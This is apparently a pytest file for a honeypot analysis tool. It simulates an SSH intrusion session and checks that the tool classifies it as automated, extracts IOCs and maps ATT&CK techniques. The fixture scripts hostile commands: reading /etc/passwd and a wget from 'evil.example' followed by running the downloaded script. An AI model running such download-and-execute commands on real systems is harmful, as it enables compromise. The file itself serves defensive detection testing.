"""End-to-end intelligence report (Phase 4): capture -> analyze -> persist."""

from __future__ import annotations

import datetime as dt

import pytest
from sqlalchemy import select

from deceptinet.analysis.intel import analyze_session
from deceptinet.datastore.models import IOC, Session, Technique
from deceptinet.telemetry.recorder import TelemetryRecorder

pytestmark = pytest.mark.asyncio

_BASE = dt.datetime(2026, 1, 1, tzinfo=dt.timezone.utc)


async def _make_automated_session(datastore) -> str:
    rec = TelemetryRecorder(datastore)
    handle = await rec.open_session(
        experiment_id="t", mode="vanilla", service="ssh",
        src_ip="203.0.113.9", src_port=40001,
        client_version="SSH-2.0-libssh2_1.10.0", term_type=None,  # no PTY
    )
    await handle.record_credential("root", "root", "password", accepted=False, ts=_BASE)
    await handle.record_credential("root", "123456", "password", accepted=True, ts=_BASE)
    cmds = ["uname -a", "cat /etc/passwd", "wget http://evil.example/x.sh", "chmod +x x.sh", "./x.sh"]
    for i, c in enumerate(cmds):
        await handle.record_event(
            "command", command=c, response="...", engine_mode="vanilla",
            ts=_BASE + dt.timedelta(seconds=i * 0.1),
        )
    await handle.close()
    return handle.session_id


async def test_intel_report_and_persistence(datastore):
    sid = await _make_automated_session(datastore)
    report = analyze_session(datastore, sid, persist=True)

    # Classification
    assert report["classification"]["label"] == "automated"
    assert report["classification"]["confidence"] > 0.5
    assert report["classification"]["reasons"]

    # IOCs
    assert "http://evil.example/x.sh" in report["iocs"]["url"]
    assert "evil.example" in report["iocs"]["domain"]
    assert "root:123456" in report["iocs"]["credential"]

    # ATT&CK techniques
    tids = {t["id"] for t in report["attack_techniques"]}
    assert {"T1059", "T1087", "T1105", "T1110", "T1078"} <= tids

    # Persistence: session row + IOC/Technique tables updated.
    with datastore.session() as s:
        sess = s.get(Session, sid)
        assert sess.session_classification == "automated"
        assert sess.classification_confidence is not None
        assert sess.meta and sess.meta["classification"]["label"] == "automated"
        n_iocs = s.scalars(select(IOC).where(IOC.session_id == sid)).all()
        n_tech = s.scalars(select(Technique).where(Technique.session_id == sid)).all()
        assert len(n_iocs) >= 3
        assert any(t.technique_id == "T1105" for t in n_tech)


async def test_reanalysis_is_idempotent(datastore):
    sid = await _make_automated_session(datastore)
    analyze_session(datastore, sid, persist=True)
    analyze_session(datastore, sid, persist=True)  # run twice
    with datastore.session() as s:
        techs = s.scalars(select(Technique).where(Technique.session_id == sid)).all()
        # No duplication of the same technique id for the session.
        ids = [t.technique_id for t in techs]
        assert len(ids) == len(set(ids))
